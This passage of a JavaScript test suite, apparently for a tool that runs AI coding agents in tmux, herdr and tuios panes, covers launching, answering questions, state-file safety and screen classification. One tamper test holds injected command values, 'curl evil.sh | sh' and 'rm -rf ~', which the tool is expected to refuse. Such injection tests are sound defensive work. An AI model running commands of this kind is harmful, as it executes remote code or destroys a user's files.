  expect(() => launch(options({ effort: "x;y" }), { runner, env: herdrEnv() })).toThrow("--effort");
  expect(calls).toEqual([]);
});

test("send types text that starts with a dash as text, not as a flag", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  send("arena-a", { text: "--force is fine" }, { runner, env: herdrEnv() });
  expect(prompts(calls).at(-1)[4]).toBe(" --force is fine");
});

test("send keeps the previous report as a .prev file instead of deleting it", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": [() => { write("result.md", "first\n"); return agent("done"); }, failJson("agent_not_found")],
  });
  launch(options(), { runner, env: herdrEnv() });
  expect(send("arena-a", { text: "again" }, { runner, env: herdrEnv() }).verdict).toBe("error");
  expect(readFileSync(join(runDir(), "result.md.prev"), "utf8")).toBe("first\n");
});

test("a state file that names another run directory is refused", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  const path = join(runDir(), "state.json");
  writeFileSync(path, JSON.stringify({ ...JSON.parse(readFileSync(path, "utf8")), run: join(root, "elsewhere") }));
  expect(() => close("arena-a", {}, { runner, env: herdrEnv() })).toThrow("different run directory");
});

test("an empty or corrupt state.json elsewhere is skipped by launch and list", () => {
  for (const [entry, body] of [["empty", ""], ["torn", '{"name": "torn", "mux": "her']]) {
    mkdirSync(join(root, "panes", entry), { recursive: true, mode: 0o700 });
    writeFileSync(join(root, "panes", entry, "state.json"), body);
  }
  const { runner } = doneHerdr();
  const env = { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" };
  expect(launch(options(), { runner, env })).toMatchObject({ name: "arena-a", verdict: "done" });
  expect(list({ env }).map((a) => a.name)).toEqual(["arena-a"]);
});

test("state is saved by replacing state.json, never by writing through it", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": failJson("agent_blocked") });
  launch(options(), { runner, env: herdrEnv() });
  const path = join(runDir(), "state.json");
  const outside = join(root, "outside.json");
  const before = readFileSync(path, "utf8");
  writeFileSync(outside, before);
  rmSync(path);
  symlinkSync(outside, path);
  send("arena-a", { text: "go on" }, { runner, env: herdrEnv() });
  expect(readFileSync(outside, "utf8")).toBe(before);
  expect(lstatSync(path).isSymbolicLink()).toBe(false);
  expect(readdirSync(runDir()).filter((f) => f.endsWith(".tmp"))).toEqual([]);
});

test.skipIf(typeof process.getuid !== "function")("a shared, world-writable panes directory is refused", () => {
  const { runner, calls } = scripted({});
  mkdirSync(join(root, "panes"));
  chmodSync(join(root, "panes"), 0o777);
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("no one else can write to");
  expect(calls).toEqual([]);
});

test("tuios treats state none as working until it sees activity or a report", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("none"),
    "tuios wait-for": [{ status: 1, stdout: "", stderr: "timeout" }, () => { write("result.md", "no hooks\n"); return text(""); }],
  });
  const out = launch(options(), { runner, env: tuiosEnv() });
  expect(out).toMatchObject({ verdict: "done", result: "no hooks\n" });
  expect(calls.filter((c) => c[1] === "ask-agent")).toHaveLength(0);
});

test("tuios reports stalled when the turn never starts and does not type a nudge into it", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("idle"),
    "tuios wait-for": { status: 1, stdout: "", stderr: "timeout" },
  });
  expect(launch(options({ timeoutMs: 1500 }), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "stalled", screen: "tuios screen" });
  expect(calls.filter((c) => c[1] === "ask-agent")).toHaveLength(0);
});

const slices = (calls) => calls.filter((c) => c[1] === "wait-for").map((c) => Number(c[c.indexOf("--timeout") + 1]));

test("a hookless tuios pane is checked for report files every few seconds from the first wait", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("none"),
    "tuios wait-for": [{ status: 1, stdout: "", stderr: "timeout" }, () => { write("result.md", "hookless\n"); return { status: 1, stdout: "", stderr: "timeout" }; }],
  });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "hookless\n" });
  expect(Math.max(...slices(calls))).toBeLessThanOrEqual(5000);
});

test("a tuios agent whose state hook was lost still ends its turn when it reports", () => {
  for (const state of ["working", "unknown"]) {
    const { runner, calls } = scripted({
      ...tuiosBase,
      "tuios get-agent-state": state === "unknown" ? text("not json") : tuiosState(state),
      "tuios wait-for": () => { write("result.md", `lost ${state}\n`); return { status: 1, stdout: "", stderr: "timeout" }; },
    });
    expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: `lost ${state}\n` });
    expect(Math.max(...slices(calls))).toBeLessThanOrEqual(5000);
    rmSync(runDir(), { recursive: true, force: true });
  }
});

test("a tuios state read that cannot be parsed while wait-for succeeds at once is paced, not spun", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": text("not json"),
    "tuios wait-for": text(""),
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  const started = Date.now();
  expect(waitFor("arena-a", { timeoutMs: 1000 }, { runner, env: tuiosEnv() }).verdict).toBe("stalled");
  expect(Date.now() - started).toBeGreaterThanOrEqual(900);
  expect(calls.filter((c) => c[1] === "get-agent-state").length).toBeLessThan(8);
});

const savedState = () => JSON.parse(readFileSync(join(runDir(), "state.json"), "utf8"));

test("a tuios wait after a delivered question blocks while the agent works instead of returning the same question", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done"), tuiosState("working"), tuiosState("working"), tuiosState("done")],
    "tuios wait-for": [
      () => { write("question.md", "Which branch?\n"); return text(""); },
      () => { write("result.md", "final\n"); age("question.md", 60); return text(""); },
    ],
  });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "question", question: "Which branch?\n" });
  const before = calls.filter((c) => c[1] === "wait-for").length;
  expect(waitFor("arena-a", {}, { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "final\n" });
  expect(calls.filter((c) => c[1] === "wait-for").length).toBeGreaterThan(before);
});

test("a dialog that opens after a delivered question is reported as blocked, with the question alongside", () => {
  const { runner } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": () => { write("question.md", "Which branch?\n"); return tuiosState("needs_input"); },
    "tuios peek-prompt": text("Allow Bash: git push? [y/n]\n"),
  });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({
    verdict: "blocked", screen: "Allow Bash: git push? [y/n]", question: "Which branch?\n",
  });
});

test("send --keys after a startup dialog waits for the first turn to start before it judges the turn over", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("needs_input"), tuiosState("idle"), tuiosState("idle"), tuiosState("idle"), tuiosState("working"), tuiosState("idle")],
    "tuios wait-for": text(""),
    "tuios send-keys": text(""),
    "tuios ask-agent": text("nudged\n"),
  });
  expect(launch(options(), { runner, env: tuiosEnv() }).verdict).toBe("blocked");
  expect(savedState().awaitTurn).toBe(true);
  send("arena-a", { keys: "Enter" }, { runner, env: tuiosEnv() });
  const afterKeys = calls.slice(calls.findIndex((c) => c[1] === "send-keys"));
  expect(afterKeys.find((c) => c[1] === "wait-for")).toContain("working,needs_input,errored,done");
  expect(savedState().awaitTurn).toBe(false);
});

test("the turn-start wait is dropped once a turn is seen, and kept when a short timeout ends first", () => {
  const { runner } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("working"), tuiosState("idle")],
    "tuios wait-for": text(""),
    "tuios ask-agent": text("nudged\n"),
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  expect(savedState().awaitTurn).toBe(true);
  waitFor("arena-a", {}, { runner, env: tuiosEnv() });
  expect(savedState().awaitTurn).toBe(false);

  const quiet = scripted({ ...tuiosBase, "tuios get-agent-state": tuiosState("none"), "tuios wait-for": { status: 1, stdout: "", stderr: "timeout" } });
  close("arena-a", {}, { runner: quiet.runner, env: tuiosEnv() });
  launch(options({ wait: false }), { runner: quiet.runner, env: tuiosEnv() });
  expect(waitFor("arena-a", { timeoutMs: 1000 }, { runner: quiet.runner, env: tuiosEnv() }).verdict).toBe("timeout");
  expect(savedState().awaitTurn).toBe(true);
});

test("tuios launch --no-wait then wait still sends the one reminder when the turn ends with no report", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("idle"), tuiosState("working"), tuiosState("idle")],
    "tuios wait-for": text(""),
    "tuios ask-agent": text("nudged\n"),
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  expect(waitFor("arena-a", {}, { runner, env: tuiosEnv() }).verdict).toBe("no_result");
  const asks = calls.filter((c) => c[1] === "ask-agent");
  expect(asks).toHaveLength(1);
  expect(asks[0]).toContain(nudgePrompt(runDir()));
  const first = calls.find((c) => c[1] === "wait-for");
  expect(first[first.indexOf("--until") + 1]).toBe("working,needs_input,errored,done");
  expect(calls.indexOf(first)).toBeLessThan(calls.indexOf(asks[0]));
});

test("a tuios wait-for that fails at once is paced and still ends at the deadline", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("working"),
    "tuios wait-for": { status: 1, stdout: "", stderr: "server unreachable" },
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  const started = Date.now();
  expect(waitFor("arena-a", { timeoutMs: 1000 }, { runner, env: tuiosEnv() }).verdict).toBe("timeout");
  expect(Date.now() - started).toBeGreaterThanOrEqual(900);
  expect(calls.filter((c) => c[1] === "get-agent-state").length).toBeLessThan(8);
});

test("a tuios ask-agent failure is an error verdict, not a silent no_result", () => {
  const { runner } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("done"),
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
    "tuios ask-agent": { status: 1, stdout: "", stderr: "rate_limited" },
  });
  launch(options(), { runner, env: tuiosEnv() });
  expect(send("arena-a", { text: "more" }, { runner, env: tuiosEnv() }))
    .toMatchObject({ verdict: "error", detail: expect.stringContaining("ask-agent failed: rate_limited") });
});

test("closing a tuios agent whose window already exited still removes its run directory", () => {
  const gone = { status: 1, stdout: "", stderr: "window not found" };
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done"), gone],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options(), { runner, env: tuiosEnv() });
  expect(close("arena-a", {}, { runner, env: tuiosEnv() })).toMatchObject({ closed: true, kept: null });
  expect(calls.some((c) => c[1] === "run-command")).toBe(false);
  expect(existsSync(runDir())).toBe(false);
});

const ambiguousTmux = { TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%3" };
const doneHerdr = () => scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });

test("a pane agent's own launch is prefixed with its name and records its pane as the parent", () => {
  const { runner, calls } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
  expect(launch(options({ name: "fix" }), { runner, env: childEnv })).toMatchObject({ name: "arena-a-fix", mux: "herdr" });
  expect(calls.filter((c) => c[2] === "create").at(-1)).toContain("arena-a-fix");
  const state = JSON.parse(readFileSync(join(root, "panes", "arena-a-fix", "state.json"), "utf8"));
  expect(state.parent).toEqual({ mux: "herdr", pane: "wP:p2" });
});

test("a pane agent's own launch runs in its multiplexer even when another one is also set", () => {
  const { runner } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2", ...ambiguousTmux };
  expect(launch(options({ name: "fix" }), { runner, env: childEnv })).toMatchObject({ name: "arena-a-fix", mux: "herdr" });
  const stranger = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p9", ...ambiguousTmux };
  expect(() => launch(options({ name: "other" }), { runner, env: stranger })).toThrow("pass --mux");
});

test("a nested name over the limit names both parts and opens nothing", () => {
  const { runner, calls } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  const before = calls.length;
  const given = "a".repeat(25);
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
  expect(() => launch(options({ name: given }), { runner, env: childEnv }))
    .toThrow(`arena-a-${given} is longer than 32 characters; shorten --name ${given}, since your own name arena-a`);
  expect(calls.slice(before)).toEqual([["herdr", "pane", "get", "wP:p2"]]);
});

test("a launch is nested only under a live, open pane agent on the caller's own server", () => {
  const plant = (name, extra = {}) => {
    mkdirSync(join(root, "panes", name), { recursive: true, mode: 0o700 });
    const state = { name, mux: "tmux", run: join(root, "panes", name), ids: { pane: "%0", window: "@0", server: tmuxEnv().TMUX }, ...extra };
    writeFileSync(join(root, "panes", name, "state.json"), JSON.stringify(state));
  };
  const launchFix = (deadPanes = []) => {
    const { runner } = scripted({
      ...tmuxBase,
      "tmux display-message": (args) => text(deadPanes.includes(args[args.indexOf("-t") + 1]) ? "1\n" : "0\n"),
      "tmux capture-pane": [text("a"), text("b")],
    });
    const out = launch(options({ name: "fix" }), { runner, env: tmuxEnv(), clock: fakeClock() });
    rmSync(join(root, "panes", out.name), { recursive: true, force: true });
    return out.name;
  };
  plant("old", { ids: { pane: "%0", window: "@0", server: "/tmp/tmux-501/default,999,0" } });
  expect(launchFix()).toBe("fix");
  plant("old", { ids: { pane: "%0", window: "@0" } });
  expect(launchFix()).toBe("fix");
  plant("old", { closed: true });
  expect(launchFix()).toBe("fix");
  plant("old");
  expect(launchFix(["%0"])).toBe("fix");
  expect(launchFix()).toBe("old-fix");
  plant("older");
  expect(() => launchFix()).toThrow("More than one live pane agent claims this pane (old, older)");
});

test("close --keep marks the agent closed, so a later launch from its pane is not nested under it", () => {
  const { runner } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  close("arena-a", { keep: true }, { runner, env: herdrEnv() });
  expect(JSON.parse(readFileSync(join(runDir(), "state.json"), "utf8")).closed).toBe(true);
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
  expect(launch(options({ name: "fix" }), { runner, env: childEnv }).name).toBe("fix");
});

const askedHerdr = (extra = {}) => scripted({
  ...herdrBase,
  "herdr agent prompt": () => { write("question.md", "Which branch?\n"); return agent("done"); },
  ...extra,
});
const questionLine = (id) => `[pane-agent arena-a] question ${id}: ${join(runDir(), "question.md")}`;

test("ask-parent types one line naming the question into the parent herdr pane", () => {
  const { runner, calls } = askedHerdr({ "herdr pane run": text("") });
  const asked = launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
  expect(asked.verdict).toBe("question");
  expect(asked.questionId).toBe(String(statSync(join(runDir(), "question.md")).mtimeMs));
  expect(askParent(runDir(), { runner, env: {} })).toEqual({ sent: true, name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
  expect(calls.at(-1)).toEqual(["herdr", "pane", "run", "wP:p1", questionLine(asked.questionId)]);
});

test("ask-parent types the line and then Enter into the parent tuios pane", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("question.md", "Which branch?\n"); return text(""); },
    "tuios send-text": text(""),
    "tuios send-keys": text(""),
  });
  const asked = launch(options(), { runner, env: tuiosEnv() });
  askParent(runDir(), { runner, env: {} });
  expect(calls.slice(-2)).toEqual([
    ["tuios", "send-text", "-s", "work", "-w", tuiosSelf, questionLine(asked.questionId)],
    ["tuios", "send-keys", "-s", "work", "-w", tuiosSelf, "Enter"],
  ]);
});

const fakeClock = () => {
  let now = 0;
  return { now: () => now, sleep: (ms) => { now += ms; } };
};
const tmuxEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" });
const tmuxBase = {
  "tmux new-window": text("%5 @5\n"),
  "tmux display-message": text("0\n"),
  "tmux kill-window": text(""),
  "tmux set-buffer": text(""),
  "tmux paste-buffer": text(""),
  "tmux send-keys": text(""),
};

test("ask-parent types the line into the parent tmux pane literally, then Enter separately", () => {
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }],
  });
  const asked = launch(options(), { runner, env: tmuxEnv(), clock: fakeClock() });
  expect(asked).toMatchObject({ verdict: "question" });
  askParent(runDir(), { runner, env: {}, clock: fakeClock() });
  expect(calls.slice(-2)).toEqual([
    ["tmux", "send-keys", "-t", "%0", "-l", "--", questionLine(asked.questionId)],
    ["tmux", "send-keys", "-t", "%0", "Enter"],
  ]);
});

test("ask-parent types nothing into a parent pane that is blocked on a dialog, and still exits cleanly", () => {
  const herdr = askedHerdr({ "herdr pane get": okJson({ pane: { agent_status: "blocked" } }), "herdr pane run": text("") });
  launch(options(), { runner: herdr.runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
  expect(askParent(runDir(), { runner: herdr.runner, env: {} }))
    .toEqual({ sent: false, reason: "parent pane is blocked", name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
  expect(herdr.calls.at(-1)).toEqual(["herdr", "pane", "get", "wP:p1"]);
  expect(herdr.calls.some((c) => c[2] === "run")).toBe(false);
  close("arena-a", {}, { runner: herdr.runner, env: herdrEnv() });

  const childStates = ["working", "done"];
  const tuios = scripted({
    ...tuiosBase,
    "tuios get-agent-state": (args) => tuiosState(args.includes(tuiosSelf) ? "needs_input" : childStates.shift() ?? "done"),
    "tuios wait-for": () => { write("question.md", "Which branch?\n"); return text(""); },
    "tuios send-text": text(""),
    "tuios send-keys": text(""),
  });
  launch(options(), { runner: tuios.runner, env: tuiosEnv() });
  expect(askParent(runDir(), { runner: tuios.runner, env: {} })).toMatchObject({ sent: false, reason: "parent pane is blocked" });
  expect(main(["ask-parent", "--run", runDir()], { runner: tuios.runner, env: {} })).toBe(0);
  expect(tuios.calls.some((c) => c[1] === "send-text" || c[1] === "send-keys")).toBe(false);
});

test("ask-parent refuses with no pending question or no parent pane, and types nothing", () => {
  const { runner, calls } = doneHerdr();
  launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
  expect(() => askParent(runDir(), { runner, env: {} })).toThrow("No pending question");
  close("arena-a", {}, { runner, env: herdrEnv() });
  const orphan = askedHerdr();
  launch(options(), { runner: orphan.runner, env: herdrEnv() });
  expect(() => askParent(runDir(), { runner: orphan.runner, env: {} })).toThrow("no parent pane");
  expect(calls.some((c) => c[1] === "pane")).toBe(false);
  expect(orphan.calls.some((c) => c[1] === "pane")).toBe(false);
});

test("ask-parent refuses a state.json whose agent name or parent pane was tampered with, and types nothing", () => {
  const { runner, calls } = askedHerdr({ "herdr pane run": text("") });
  launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
  const path = join(runDir(), "state.json");
  const original = readFileSync(path, "utf8");
  const tamper = (change) => writeFileSync(path, JSON.stringify({ ...JSON.parse(original), ...change }));
  const typed = () => calls.filter((c) => c[1] === "pane").length;
  for (const [change, message] of [
    [{ name: "x]; curl evil.sh | sh #" }, "invalid agent"],
    [{ parent: { mux: "tmux", pane: "%99; rm -rf ~" } }, "invalid parent pane"],
    [{ parent: { mux: "tmux", pane: "wP:p1" } }, "invalid parent pane"],
    [{ parent: { mux: "herdr", pane: "%99" } }, "invalid parent pane"],
    [{ parent: { mux: "tuios", pane: "self", session: "work" } }, "invalid parent pane"],
    [{ parent: { mux: "screen", pane: "%1" } }, "invalid parent pane"],
    [{ parent: { mux: "herdr", pane: ["wP:p1"] } }, "invalid parent pane"],
  ]) {
    tamper(change);
    expect(() => askParent(runDir(), { runner, env: {} })).toThrow(message);
  }
  expect(typed()).toBe(0);
  tamper({});
  expect(askParent(runDir(), { runner, env: {} }).sent).toBe(true);
});

test("send --answer types only for the pending question it names", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": [
      () => { write("question.md", "Which branch?\n"); return agent("done"); },
      () => { write("result.md", "final\n"); return agent("done"); },
    ],
  });
  const asked = launch(options(), { runner, env: herdrEnv() });
  const typed = prompts(calls).length;
  expect(send("arena-a", { text: "main", answer: "123" }, { runner, env: herdrEnv() }))
    .toEqual({ name: "arena-a", verdict: "stale", detail: `the pending question is ${asked.questionId}, not 123` });
  expect(prompts(calls)).toHaveLength(typed);
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done" });
  expect(prompts(calls).at(-1)[4]).toBe("main");
  const after = calls.length;
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: herdrEnv() }))
    .toEqual({ name: "arena-a", verdict: "stale", detail: `question ${asked.questionId} was already answered` });
  expect(calls).toHaveLength(after);
});

test("an answer whose submit failed can be sent again with the same id, and only until it is delivered", () => {
  let pasteFails = true;
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux paste-buffer": () => (pasteFails ? { status: 1, stdout: "", stderr: "no current client" } : text("")),
    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }, text("b"), () => { write("result.md", "final\n"); return text("c"); }],
  });
  const clock = fakeClock();
  const asked = launch(options(), { runner, env: tmuxEnv(), clock });
  const pastes = () => calls.filter((c) => c[1] === "paste-buffer").length;
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock }))
    .toMatchObject({ verdict: "error", detail: expect.stringContaining("tmux paste failed") });
  pasteFails = false;
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "done" });
  expect(pastes()).toBe(2);
  expect(calls.filter((c) => c[1] === "set-buffer").map((c) => c.at(-1))).toEqual(["main", "main"]);
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock }))
    .toEqual({ name: "arena-a", verdict: "stale", detail: `question ${asked.questionId} was already answered` });
  expect(pastes()).toBe(2);
});

test("tmux launch opens a detached named window and addresses it by pane and window id from then on", () => {
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), () => { write("result.md", "tmux result\n"); return text("b"); }],
  });
  const out = launch(options({ harness: "claude", model: "claude-opus-5-5", effort: "high" }), { runner, env: tmuxEnv(), clock: fakeClock() });
  expect(out).toMatchObject({ verdict: "done", result: "tmux result\n", mux: "tmux" });
  const open = calls[0];
  expect(open.slice(0, 11)).toEqual(["tmux", "new-window", "-d", "-P", "-F", "#{pane_id} #{window_id}", "-n", "arena-a", "-c", root, "--"]);
  expect(open[11]).toBe("claude");
  expect(open[12]).toContain("brief.md");
  const targets = calls.filter((c) => c[1] === "capture-pane" || c[1] === "display-message").map((c) => c[c.indexOf("-t") + 1]);
  expect(new Set(targets)).toEqual(new Set(["%5"]));
  close("arena-a", {}, { runner, env: tmuxEnv() });
  expect(calls.at(-1)).toEqual(["tmux", "kill-window", "-t", "@5"]);
});

test("a tmux screen that stops changing with no report is idle, with no reminder typed into it", () => {
  const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("b")] });
  const clock = fakeClock();
  expect(launch(options(), { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "idle", screen: "b" });
  expect(clock.now()).toBeGreaterThanOrEqual(15_000);
  expect(calls.some((c) => c[1] === "paste-buffer" || c[1] === "send-keys")).toBe(false);
});

test("a tmux turn whose screen never changes after a submit is stalled", () => {
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }, text("b")],
  });
  expect(launch(options(), { runner, env: tmuxEnv(), clock: fakeClock() })).toMatchObject({ verdict: "question" });
  const clock = fakeClock();
  expect(send("arena-a", { text: "line one\nline two" }, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "stalled" });
  expect(clock.now()).toBeGreaterThanOrEqual(90_000);
  expect(clock.now()).toBeLessThan(100_000);
  const buffer = calls.find((c) => c[1] === "set-buffer");
  expect(buffer.at(-1)).toBe("line one\nline two");
  const paste = calls.find((c) => c[1] === "paste-buffer");
  expect(paste).toEqual(["tmux", "paste-buffer", "-p", "-d", "-b", buffer[3], "-t", "%5"]);
  expect(calls[calls.indexOf(paste) + 1]).toEqual(["tmux", "send-keys", "-t", "%5", "Enter"]);
});

test("a tmux wait that starts long after launch --no-wait reads a static screen as idle, while an early wait still reads it as stalled", () => {
  const { runner } = scripted({ ...tmuxBase, "tmux capture-pane": text("Allow Bash: git push?\n> 1. Yes\n  2. No") });
  const clock = fakeClock();
  launch(options({ wait: false }), { runner, env: tmuxEnv(), clock });
  clock.sleep(120_000);
  expect(waitFor("arena-a", {}, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "idle", screen: expect.stringContaining("git push") });

  close("arena-a", {}, { runner, env: tmuxEnv() });
  launch(options({ wait: false }), { runner, env: tmuxEnv(), clock });
  clock.sleep(5_000);
  expect(waitFor("arena-a", {}, { runner, env: tmuxEnv(), clock }).verdict).toBe("stalled");
});

const KEY = "ts-test-key-7f3a";
const classifiedEnv = (extra = {}) => ({ ...tmuxEnv(), TYPESAFE_API_KEY: KEY, ...extra });
const jev = (choice, confidence) => () =>
  text(JSON.stringify({ model: "jev-1.13.0", answers: { screen: { type: "choice", choice, confidence, probabilities: {} } }, usage: {} }));
const curls = (calls) => calls.filter((c) => c[0] === "curl");
const pastes = (calls) => calls.filter((c) => c[1] === "paste-buffer");
const sentBody = (input) => {
  const line = input.split("\n").find((l) => l.startsWith("data-binary = "));
  return JSON.parse(JSON.parse(line.slice("data-binary = ".length)));
};

test("a tmux screen Jev reads as a finished turn gets one reminder within seconds, then no_result", () => {
  const inputs = [];
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), text("b"), text("b"), text("b"), text("c")],
    curl: (args, opts) => { inputs.push(opts.input); return jev("turn_finished", 0.95)(); },
  });
  const clock = fakeClock();
  const out = launch(options(), { runner, env: classifiedEnv(), clock });
  expect(out).toMatchObject({ verdict: "no_result", screen: "c", screenLabel: { label: "turn_finished", confidence: 0.95 } });
  expect(pastes(calls)).toHaveLength(1);
  expect(calls.find((c) => c[1] === "set-buffer").at(-1)).toBe(nudgePrompt(runDir()));
  expect(clock.now()).toBeLessThan(15_000);
  expect(inputs.map((i) => sentBody(i).state)).toEqual(["b", "c"]);
  expect(sentBody(inputs[0])).toMatchObject({ model: "jev-latest", questions: { screen: { type: "choice" } } });
  expect(Object.keys(sentBody(inputs[0]).questions.screen.criteria)).toEqual(["turn_finished", "not_started", "dialog_open", "asked_in_terminal", "still_working"]);
  expect(inputs[0]).toContain(`header = "Authorization: Bearer ${KEY}"`);
  expect(calls.flat().some((a) => String(a).includes(KEY))).toBe(false);
});

test("a finished turn below 0.9 confidence types nothing, is classified once, and falls through to idle", () => {
  const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("b")], curl: jev("turn_finished", 0.85) });
  const clock = fakeClock();
  expect(launch(options(), { runner, env: classifiedEnv(), clock }))
    .toMatchObject({ verdict: "idle", screen: "b", screenLabel: { label: "turn_finished", confidence: 0.85 } });
  expect(clock.now()).toBeGreaterThanOrEqual(15_000);
  expect(curls(calls)).toHaveLength(1);
  expect(calls.some((c) => c[1] === "paste-buffer" || c[1] === "send-keys")).toBe(false);
});

test("Jev receives only the last 60 lines of a longer tmux capture", () => {
  const lines = Array.from({ length: 100 }, (_, i) => `line ${i + 1}`);
  const sent = [];
  const { runner } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), text(lines.join("\n"))],
    curl: (args, opts) => { sent.push(sentBody(opts.input).state); return jev("dialog_open", 0.9)(); },
  });
  launch(options(), { runner, env: classifiedEnv(), clock: fakeClock() });
  expect(sent).toEqual([lines.slice(-60).join("\n")]);
});

test("a tmux welcome banner Jev reads as not started holds until 90 seconds after the launch, then returns stalled and types nothing", () => {
  const blank = Array.from({ length: 16 }, () => text("a"));
  const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [...blank, text("Claude Code v2")], curl: jev("not_started", 0.8) });
  const clock = fakeClock();
  expect(launch(options(), { runner, env: classifiedEnv(), clock }))
    .toMatchObject({ verdict: "stalled", screen: "Claude Code v2", screenLabel: { label: "not_started", confidence: 0.8 } });
  expect(clock.now()).toBeGreaterThanOrEqual(90_000);
  expect(clock.now()).toBeLessThan(100_000);
  expect(curls(calls)).toHaveLength(1);
  expect(calls.some((c) => c[1] === "paste-buffer" || c[1] === "send-keys")).toBe(false);
});

test("a wait after launch --no-wait holds a banner only until 90 seconds after the launch", () => {
  const { runner } = scripted({ ...tmuxBase, "tmux capture-pane": text("OpenAI Codex (v0.157.1)"), curl: jev("not_started", 0.95) });
  const clock = fakeClock();
  launch(options({ wait: false }), { runner, env: classifiedEnv(), clock });
  clock.sleep(300_000);
  expect(waitFor("arena-a", {}, { runner, env: classifiedEnv(), clock }))
    .toMatchObject({ verdict: "stalled", screenLabel: { label: "not_started", confidence: 0.95 } });
  expect(clock.now()).toBeLessThanOrEqual(302_000);

  close("arena-a", {}, { runner, env: classifiedEnv() });
  const early = fakeClock();
